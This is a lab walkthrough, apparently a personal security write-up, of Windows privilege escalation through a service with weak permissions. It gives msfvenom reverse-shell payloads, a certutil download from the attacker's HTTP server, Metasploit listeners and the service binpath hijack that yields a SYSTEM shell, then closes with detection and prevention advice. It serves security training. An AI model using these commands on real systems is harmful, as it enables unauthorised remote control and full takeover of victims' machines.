# Insecure Service Configuration

**Date:** June 2026<br>
**Author:** ShahinSecLab<br>
**Category:** Privilege Escalation<br>
**Difficulty:** Easy<br>
**Tools:** msfvenom, Metasploit, winPEAS, accesschk.exe, certutil

## Table of Contents

* [Introduction](#Introduction)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 — Generating a Malicious Payload with msfvenom](#step-1--generating-a-malicious-payload-with-msfvenom)
* [Step 2 — Setting Up Metasploit Listener and HTTP Server](#step-2--setting-up-metasploit-listener-and-http-server)
* [Step 3 — Downloading the Payload on the Victim Machine](#step-3--downloading-the-payload-on-the-victim-machine)
* [Step 4 — Transferring the Payload to PrivEsc Folder](#step-4--transferring-the-payload-to-privesc-folder)
* [Step 5 — Running the Payload and Getting a Meterpreter Shell](#step-5--running-the-payload-and-getting-a-meterpreter-shell)
* [Step 6 — Enumerating the Victim and Uploading winPEAS](#step-6--enumerating-the-victim-and-uploading-winpeas)
* [Step 7 — Running winPEAS to Find Privilege Escalation Paths](#step-7--running-winpeas-to-find-privilege-escalation-paths)
* [Step 8 — Verifying Service Permissions with accesschk.exe](#step-8--verifying-service-permissions-with-accesschkexe)
* [Step 9 — Checking the Service Configuration](#step-9--checking-the-service-configuration)
* [Step 10 — Generating a New Payload and Starting a Second Listener](#step-10--generating-a-new-payload-and-starting-a-second-listener)
* [Step 11 — Uploading the New Payload and Changing the Service Binary Path](#step-11--uploading-the-new-payload-and-changing-the-service-binary-path)
* [Step 12 — Starting the Service and Getting a SYSTEM Shell](#step-12--starting-the-service-and-getting-a-system-shell)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)

## Introduction

Insecure Service Configuration is a Windows privilege escalation technique that happens because of weak service permissions.

Windows services can run in the background with high privileges. If a normal user has permission to change a service configuration, they can modify how the service runs.

In this attack, I changed the service binary path and pointed it to my own executable. When the service started again, Windows executed my file with the same privileges as the service. Since the service was running as `LocalSystem`, I gained `SYSTEM` access to the machine.

## Attack Flow

```
Generated malicious payload (reverse.exe) on Kali with msfvenom
                              ↓
Started Metasploit listener on port 4444
                              ↓
Hosted payload over HTTP with Python HTTP server
                              ↓
Downloaded reverse.exe on victim machine via browser
                              ↓
Transferred payload to C:\PrivEsc using certutil
                              ↓
Ran reverse.exe on victim machine
                              ↓
Got Meterpreter shell on Kali as low privilege user (MSEDGEWIN10\user)
                              ↓
Uploaded winPEAS and ran it to find privilege escalation paths
                              ↓
winPEAS flagged daclsvc service as vulnerable
                              ↓
Verified with accesschk.exe — found SERVICE_CHANGE_CONFIG permission
                              ↓
Checked service config — daclsvc runs as LocalSystem (SYSTEM)
                              ↓
Generated second payload (privesc.exe) on port 9001
                              ↓
Uploaded privesc.exe to C:\PrivEsc on victim
                              ↓
Changed daclsvc binary path to C:\PrivEsc\privesc.exe
                              ↓
Started daclsvc service
                              ↓
Metasploit caught SYSTEM shell on port 9001
                              ↓
whoami → nt authority\system
```

## Why This Attack Works

Windows services often run with high privileges such as `LocalSystem`. If a normal user can modify the service settings, the user can change the program that the service runs.

The attack works because:

- The service runs as LocalSystem (`SYSTEM`).
- The user has `SERVICE_CHANGE_CONFIG` permission.
- The service binary path can be changed by a low privilege user.
- Windows starts the modified service with the service account privileges.

After changing the service binary path to my executable and restarting the service, Windows ran my file as `SYSTEM`, which gave full control over the machine.

## Lab Setup

| Component          | Details                  |
| ------------------ | ------------------------ |
| Attacker Machine   | Kali Linux               |
| Attacker IP        | `192.168.5.128`          |
| Victim Machine     | Windows 10 (MSEDGEWIN10) |
| Victim IP          | `192.168.5.129`          |
| Network            | VMware Host-Only Network |
| Domain             | WORKGROUP                |
| Vulnerable Service | `daclsvc`                |

## Tools Used

| Tool                  | Location                    | Purpose                                  |
| --------------------- | --------------------------- | ---------------------------------------- |
| `winPEASany.exe`      | `/home/kali/Desktop/tools/` | Find possible privilege escalation paths |
| `accesschk.exe`       | `/home/kali/Desktop/tools/` | Check service permissions                |
| `msfvenom`            | Built into Kali             | Create Windows payloads                  |
| `Metasploit`          | Built into Kali             | Handle reverse Meterpreter connections   |
| `certutil`            | Built into Windows          | Download files from a remote server      |
| `Python3 HTTP Server` | Built into Kali             | Host payload files over HTTP             |

## Prerequisites

Before starting this attack, the following conditions were required:

- A Windows machine with a vulnerable service configuration
- A low privilege user account on the target machine
- The vulnerable service must run with `LocalSystem` privileges
- The current user must have permission to modify the service configuration
- Network connection between Kali and Windows machine
- Permission to perform security testing on the target system


## Step 1 — Generating a Malicious Payload with `msfvenom`

I used `revshells.com` to prepare the `msfvenom` command and ran it on my Kali machine to create a Windows executable payload.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o reverse.exe
```
**Breakdown**

| Part    | Value                                 | Description                                              |
| ------- | ------------------------------------- | -------------------------------------------------------- |
| `-p`    | `windows/x64/meterpreter/reverse_tcp` | Creates a 64-bit Windows Meterpreter reverse TCP payload |
| `LHOST` | `192.168.5.128`                       | Kali machine IP address that receives the connection     |
| `LPORT` | `4444`                                | Port used by Kali to listen for the Meterpreter session  |
| `-f`    | `exe`                                 | Creates the payload as a Windows executable file         |
| `-o`    | `reverse.exe`                         | Saves the payload with the name `reverse.exe`            |

**Output:**

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```
The payload was created successfully and saved as `reverse.exe`

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step1-1.png" width="600">
</p>

## Step 2 — Setting Up Metasploit Listener and HTTP Server

I opened two terminals on my Kali machine. One terminal was used to start the Metasploit listener, and the other was used to host the payload file over HTTP.

### Terminal 1 — Started Metasploit Listener

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.5.128
set lport 4444
run
```
**Output:**

```text
[*] Started reverse TCP handler on 192.168.5.128:4444
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step2-1.png" width="600">
</p>

### Terminal 2 — Started Python HTTP Server

I started a simple HTTP server to share the `reverse.exe` file with the Windows machine.

```bash
python3 -m http.server 80
```
**Breakdown**

| Part             | Description                        |
| ---------------- | ---------------------------------- |
| `python3`        | Runs Python 3                      |
| `-m http.server` | Starts a simple HTTP server module |
| `80`             | Runs the server on port 80         |

**Output:**

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step2-2.png" width="600">
</p>

## Step 3 — Downloading the Payload on the Victim Machine

I switched to the Windows 10 victim machine and opened Microsoft Edge. I accessed my Kali HTTP server using the following URL:

```bash
http://192.168.5.128/
```
The reverse.exe file was available on the page. I clicked on it to download the file.

Windows Defender blocked the file at first and showed:
```
Couldn't download - Virus detected
```
For this lab environment, I disabled Real-time Protection and Threat Protection in Windows Defender settings. After that, the file downloaded successfully.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step3-1.png" width="600">
</p>

## Step 4 — Transferring the Payload to `C:\PrivEsc` Folder

I opened Command Prompt in the `C:\PrivEsc` folder and used certutil to download `reverse.exe` from my Kali HTTP server.

```bash
certutil -urlcache -split -f http://192.168.5.128/reverse.exe reverse.exe
```
**Breakdown**

| Part        | Description                              |
| ----------- | ---------------------------------------- |
| `-urlcache` | Downloads a file from a URL              |
| `-split`    | Downloads the file in parts              |
| `-f`        | Overwrites the file if it already exists |

**Output:**

```text
CertUtil: -URLCache command completed successfully.
```
The payload was downloaded successfully and saved as `reverse.exe` in the `C:\PrivEsc` folder.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step4-1.png" width="600">
</p>

## Step 5 — Running the Payload and Getting a Meterpreter Shell

On the Windows victim machine, I ran the payload file:

```bash
C:\PrivEsc> reverse.exe
```
### Metasploit Caught the Connection on Kali

After running the payload, Metasploit on my Kali machine received the connection and opened a Meterpreter session.

**Output:**

```text
[*] Sending stage (244806 bytes) to 192.168.5.129
[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.129:49985) at 2026-06-18 00:01:24 -0400

meterpreter >
```
**Connection details:**

- Attacker IP : 192.168.5.128
- Victim IP : 192.168.5.129
- Port : 4444
- Session : Meterpreter session 1 opened

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step5-1.png" width="600">
</p>

## Step 6 — Enumerating the Victim and Uploading `winPEAS`

### Checked System Info and Current User

After getting the Meterpreter session, I checked the system information and current user.

```bash
meterpreter > sysinfo
```

**Output:**

```text
Computer        : MSEDGEWIN10
OS              : Windows 10 1809 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```
I also checked the current user:

```bash
meterpreter > getuid
```
**Output:**

```text
Server username: MSEDGEWIN10\user
```
The session was running under a normal low privilege user account. The next step was to find a way to increase my privileges.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-1.png" width="600">
</p>

### Uploaded `winPEAS`

I uploaded winPEASany.exe from my Kali machine to the Windows victim using Meterpreter.

```bash
meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
```
**Breakdown**

| Part                                      | Description                                    |
| ----------------------------------------- | ---------------------------------------------- |
| `upload`                                  | Uploads a file from Kali to the victim machine |
| `/home/kali/Desktop/tools/winPEASany.exe` | Location of the winPEAS file on Kali           |

**Output:**

```text
[*] Uploading  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
[*] Uploaded 224.00 KiB of 224.00 KiB (100.0%): /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
[*] Completed  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-2.png" width="600">
</p>

## Step 7 — Running `winPEAS` to Find Privilege Escalation Paths

I opened a Windows shell from the Meterpreter session and ran winPEAS to check for possible privilege escalation paths.

```bash
meterpreter > shell
```
```cmd
C:\PrivEsc> .\winPEASany.exe
```
`winPEAS` scanned the system and found that the `daclsvc` service had weak permissions. The service permissions were not properly configured, which allowed a low privilege user to change the service settings. I selected daclsvc as my target and continued with the next steps.

## Step 8 — Verifying Service Permissions with `accesschk.exe`

### Uploaded `accesschk.exe`

I uploaded `accesschk.exe` from my Kali machine to the Windows victim using Meterpreter.

```bash
meterpreter > upload /home/kali/Desktop/tools/accesschk.exe
```

```text
[*] Uploading  : /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
[*] Uploaded 217.38 KiB of 217.38 KiB (100.0%): /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
[*] Completed  : /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-1.png" width="600">
</p>

### Checked Service Permissions

I used `accesschk.exe` to check what permissions my current user had on the `daclsvc` service.

```bash
C:\PrivEsc> .\accesschk.exe /accepteula -uwcqv user daclsvc
```
**Breakdown**

| Part              | Description                                              |
| ----------------- | -------------------------------------------------------- |
| `.\accesschk.exe` | Runs `accesschk.exe` from the current folder             |
| `/accepteula`     | Accepts the Sysinternals license agreement automatically |
| `-u`              | Shows the service permissions for the specified user     |
| `-w`              | Shows objects where the user has write permissions       |
| `-c`              | Checks Windows services                                  |
| `-q`              | Runs in quiet mode and shows only important information  |
| `-v`              | Shows detailed information                               |
| `user`            | The Windows user account being checked                   |
| `daclsvc`         | The service name being checked                           |

**Output:**

```
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```
The important permissions were:

`RW daclsvc` : I had read and write access to the service.
`SERVICE_CHANGE_CONFIG` : I could change the service configuration, including the binary path.
`SERVICE_START` : I could start the service.
`SERVICE_STOP` : I could stop the service.

`SERVICE_CHANGE_CONFIG` was the important permission because it allowed me to change the service executable path and point it to my own payload.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-2.png" width="600">
</p>

## Step 9 — Checking the Service Configuration

After confirming that I had permission to modify the service, I checked the service configuration to see how it was running.

```bash
C:\PrivEsc> sc qc daclsvc
```
**Breakdown**

| Part      | Description                                             |
| --------- | ------------------------------------------------------- |
| `sc`      | Windows Service Control command used to manage services |
| `qc`      | Displays the service configuration                      |
| `daclsvc` | The service name being checked                          |

**Output:**

```
SERVICE_NAME: daclsvc
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        SERVICE_START_NAME : LocalSystem
```
| Field                | Value                                           | Meaning                                 |
| -------------------- | ----------------------------------------------- | --------------------------------------- |
| `BINARY_PATH_NAME`   | `C:\Program Files\DACL Service\daclservice.exe` | Location of the service executable      |
| `SERVICE_START_NAME` | `LocalSystem`                                   | The service runs with SYSTEM privileges |

The output showed that `daclsvc` runs as `LocalSystem`. Since I could change the service configuration, I could replace the binary path with my own payload and run it with `SYSTEM` privileges.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step9-1.png" width="600">
</p>

## Step 10 — Generating a New Payload and Starting a Second Listener

I created another payload with a different port. The first listener was already used for the low privilege Meterpreter session, so I used a new port to receive the SYSTEM shell.

### Generated New Payload on Kali

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=9001 -f exe -o privesc.exe
```
**Breakdown**

| Part    | Value                                 | Description                                                     |
| ------- | ------------------------------------- | --------------------------------------------------------------- |
| `-p`    | `windows/x64/meterpreter/reverse_tcp` | Creates a Windows Meterpreter reverse TCP payload.              |
| `LHOST` | `192.168.5.128`                       | The IP address of my Kali machine that receives the connection. |
| `LPORT` | `9001`                                | The port used to receive the Meterpreter session.               |
| `-f`    | `exe`                                 | Creates the payload as a Windows executable file.               |
| `-o`    | `privesc.exe`                         | Saves the payload with the name privesc.exe.                    |

**Output:**

```
Final size of exe file: 7680 bytes
Saved as: privesc.exe
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-1.png" width="600">
</p>

### Started Second Metasploit Listener on Port 9001

I started another Metasploit listener on port `9001` to receive the connection after the service runs my payload with SYSTEM privileges.

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.5.128
set lport 9001
run
```
**Output:**
```
[*] Started reverse TCP handler on 192.168.5.128:9001
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-2.png" width="600">
</p>

## Step 11 — Uploading the New Payload and Changing the Service Binary Path

### Uploaded `privesc.exe`

I uploaded the new payload from my Kali machine to the victim machine using Meterpreter.

```bash
meterpreter > upload /home/kali/Desktop/privesc.exe
```
**Output:**

```
[*] Uploading  : /home/kali/Desktop/tools/privesc.exe -> privesc.exe
[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kali/Desktop/tools/privesc.exe -> privesc.exe
[*] Completed  : /home/kali/Desktop/tools/privesc.exe -> privesc.exe
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-1.png" width="600">
</p>

### Changed the Service Binary Path

The service had `SERVICE_CHANGE_CONFIG permission`, so I changed the service binary path to my uploaded payload.

```bash
C:\PrivEsc> sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
```
**Breakdown**

| Part                       | Description                                              |
| -------------------------- | -------------------------------------------------------- |
| `sc`                       | Windows Service Control command used to manage services. |
| `config`                   | Changes the service configuration.                       |
| `daclsvc`                  | Name of the vulnerable service.                          |
| `binpath=`                 | Changes the file path that the service runs.             |
| `"C:\PrivEsc\privesc.exe"` | New executable path that the service will run.           |

**Output:**

```
sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
[SC] ChangeServiceConfig SUCCESS
```
The service binary path was changed from the original file to my payload.

|------Field--------|-----------------------Before-------------------|---------------After--------|
|BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe   |C:\PrivEsc\privesc.exe      |

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
</p>

## Step 12 — Starting the Service and Getting a SYSTEM Shell

### Started the Service

After changing the service binary path, I started the service. The service executed my payload instead of the original file.

```bash
C:\PrivEsc> net start daclsvc
```
**Breakdown**

| Part      | Description                                                    |
| --------- | -------------------------------------------------------------- |
| `net`     | Windows command used to manage services and network resources. |
| `start`   | Starts a Windows service.                                      |
| `daclsvc` | Name of the vulnerable service.                                |

### Metasploit Caught the SYSTEM Shell

After the service started, Metasploit received the connection.
```
[*] Meterpreter session 1 opened (192.168.5.128:9001 -> 192.168.5.129:60971) at 2026-06-18 08:03:48 -0400
```
I opened a command shell and checked the current user.

```bash
meterpreter > shell
```
```bash
C:\Windows\system32>whoami
```
**Output:**

```
nt authority\system
```
I moved from a normal low privilege user to `nt authority\system` by changing the binary path of a service that had weak permissions.

## How Defenders Can Catch This

- Regularly check Windows services for unusual permissions.
- Monitor changes to service configurations, especially `ImagePath` or `BinaryPathName`.
- Check for normal users having permissions like `SERVICE_CHANGE_CONFIG`.
- Monitor new executable files appearing in unusual locations such as `C:\PrivEs`c or temporary folders.
- Review Windows Event Logs for service creation and modification events.
- Use security tools to detect unexpected services running as `SYSTEM`.
- Look for suspicious reverse shell connections from service processes.

## How to Prevent It

- Remove unnecessary permissions from normal users on Windows services.
- Do not allow standard users to change service configurations.
- Make sure only administrators can modify service binary paths.
- Run services with the lowest required privileges.
- Regularly review service permissions and configurations.
- Keep Windows and installed software updated.
- Use application control to prevent unknown executables from running.
- Follow the principle of least privilege.

## References

| Resource | Link |
|----------|------|
| Microsoft Service Security and Access Rights Documentation | https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights |
| Microsoft Service Configuration Documentation | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config |
| AccessChk Documentation (Microsoft Sysinternals) | https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk |
| winPEAS Repository | https://github.com/peass-ng/PEASS-ng |
| Metasploit Framework Documentation | https://docs.metasploit.com/ |

## Lessons Learned

While working through this attack I learned that:

- A service running as SYSTEM becomes dangerous when normal users can modify its settings.
- SERVICE_CHANGE_CONFIG permission can allow a low privilege user to replace the service executable path.
- Always check service permissions during a Windows privilege escalation assessment.
- Running services with unnecessary privileges increases security risks.
- Small configuration mistakes can lead to full SYSTEM access.
- Tools like winPEAS and accesschk.exe help find weak service permissions quickly.
- Proper service permissions and regular audits can prevent this type of privilege escalation.